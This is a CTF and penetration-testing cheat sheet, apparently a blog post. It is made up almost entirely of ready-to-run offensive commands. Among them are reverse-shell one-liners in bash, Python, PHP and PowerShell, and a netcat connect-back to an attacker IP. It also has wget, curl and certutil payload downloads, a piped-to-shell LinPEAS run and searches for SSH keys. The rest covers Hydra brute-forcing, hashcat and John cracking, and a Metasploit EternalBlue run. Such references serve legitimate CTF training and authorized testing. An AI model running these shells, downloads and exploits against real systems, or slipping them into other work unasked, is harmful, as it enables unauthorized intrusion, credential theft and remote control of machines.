---
title: "General CTF — Cheat Sheet"
date: 2026-03-22
author: "Basil9099"
tags: ["cheatsheet", "ctf", "htb", "privesc", "linpeas", "metasploit", "hashcat"]
categories: ["Cheats"]
summary: "General-purpose CTF reference covering file transfers, shells, privilege escalation, password cracking, and more."
---

## Shells & Listeners

### Netcat

```bash
# Start listener
nc -lvnp 4444

# Connect back (simple)
nc <attacker_IP> 4444 -e /bin/bash

# File transfer — sender
nc -w 3 <receiver_IP> 4444 < file.txt

# File transfer — receiver
nc -lvnp 4444 > file.txt
```

### Reverse Shell One-Liners

```bash
# Bash
bash -i >& /dev/tcp/<IP>/4444 0>&1

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("<IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

> Use [revshells.com](https://www.revshells.com/) for auto-generated shells.

### Shell Upgrade (TTY)

```bash
# After catching shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: Ctrl+Z
stty raw -echo; fg
# Press Enter twice, then:
export TERM=xterm
stty rows 40 cols 160
```

---

## File Transfers

### HTTP Server (serving files from attacker)

```bash
# Python 3
python3 -m http.server 8080

# PHP
php -S 0.0.0.0:8080
```

### Downloading on Target

```bash
# Linux
wget http://<attacker_IP>:8080/file -O /tmp/file
curl http://<attacker_IP>:8080/file -o /tmp/file

# Windows (PowerShell)
Invoke-WebRequest -Uri http://<attacker_IP>:8080/file -OutFile C:\Windows\Temp\file.exe

# Windows (certutil)
certutil -urlcache -split -f http://<attacker_IP>:8080/file C:\Windows\Temp\file.exe
```

### SCP / SMB

```bash
# SCP to target
scp file user@<IP>:/tmp/file

# Host SMB share (impacket)
impacket-smbserver share . -smb2support

# Access from Windows target
copy \\<attacker_IP>\share\file.exe C:\Windows\Temp\
```

---

## Privilege Escalation

### LinPEAS / WinPEAS

```bash
# Download and run LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or transfer and run
chmod +x linpeas.sh && ./linpeas.sh | tee linpeas_out.txt

# WinPEAS (Windows)
.\winPEASx64.exe > winpeas_out.txt
```

### Linux Quick Checks

```bash
# Current user and groups
id && whoami

# Sudo rights
sudo -l

# SUID binaries (check gtfobins.github.io)
find / -perm -4000 -type f 2>/dev/null

# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Writable cron scripts
find /etc/cron* -writable 2>/dev/null

# NFS no_root_squash
cat /etc/exports

# Interesting files
find / -name "*.conf" -o -name "*.bak" -o -name "*.old" 2>/dev/null
find /home -name "*.txt" -o -name "*.key" -o -name "id_rsa" 2>/dev/null

# Running processes
ps aux
# Watch for processes run as root
ps aux | grep root
```

### Windows Quick Checks

```powershell
# Current user
whoami /all

# Local admins
net localgroup administrators

# Stored credentials
cmdkey /list

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Scheduled tasks
schtasks /query /fo LIST /v | findstr "Task\|Run\|Status"
```

> Reference: [GTFOBins](https://gtfobins.github.io/) (Linux) | [LOLBAS](https://lolbas-project.github.io/) (Windows)

---

## Password Cracking

### Hashcat

```bash
# Identify hash type first (use haiti or hash-identifier)
hashcat --example-hashes | grep -i ntlm

# MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# SHA-256
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt

# NTLM
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

# bcrypt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked
hashcat -m 0 hash.txt --show
```

### John the Ripper

```bash
# Auto-detect format
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# SSH key
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# ZIP password
zip2john file.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked
john hash.txt --show
```

---

## Brute Forcing

### Hydra

```bash
# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<IP>

# HTTP POST form
hydra -l admin -P rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# FTP
hydra -l ftp -P rockyou.txt ftp://<IP>

# Multiple users from file
hydra -L users.txt -P rockyou.txt ssh://<IP>
```

---

## Web Fuzzing (ffuf)

```bash
# Directory fuzzing
ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Parameter fuzzing (GET)
ffuf -u "http://<IP>/page?FUZZ=value" -w params.txt

# POST body fuzzing
ffuf -u http://<IP>/login -X POST -d "username=admin&password=FUZZ" \
  -w /usr/share/wordlists/rockyou.txt \
  -H "Content-Type: application/x-www-form-urlencoded"

# VHost fuzzing
ffuf -u http://<IP> -H "Host: FUZZ.<domain>" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs <baseline_size>

# Filter by response size/words/lines
ffuf -u http://<IP>/FUZZ -w wordlist.txt -fs 4242 -fw 10 -fl 5
```

---

## Exploitation

### Searchsploit

```bash
# Search for exploits
searchsploit apache 2.4
searchsploit "windows 7 smb"

# Copy exploit to current directory
searchsploit -m 42031

# Update database
searchsploit -u

# Search by CVE
searchsploit CVE-2021-41773
```

### Metasploit Basics

```bash
msfconsole

# Search for module
search ms17-010
search type:exploit platform:windows smb

# Use a module
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set target
set RHOSTS <IP>
set LHOST <attacker_IP>
set LPORT 4444

# Run
run

# Background session
background

# List sessions
sessions -l

# Interact with session
sessions -i 1
```

---

## Useful Wordlists

| List | Location |
|------|----------|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` |
| common.txt | `/usr/share/seclists/Discovery/Web-Content/common.txt` |
| directory-list-2.3-medium | `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` |
| subdomains top 5k | `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` |
| usernames | `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` |
| default creds | `/usr/share/seclists/Passwords/Default-Credentials/` |
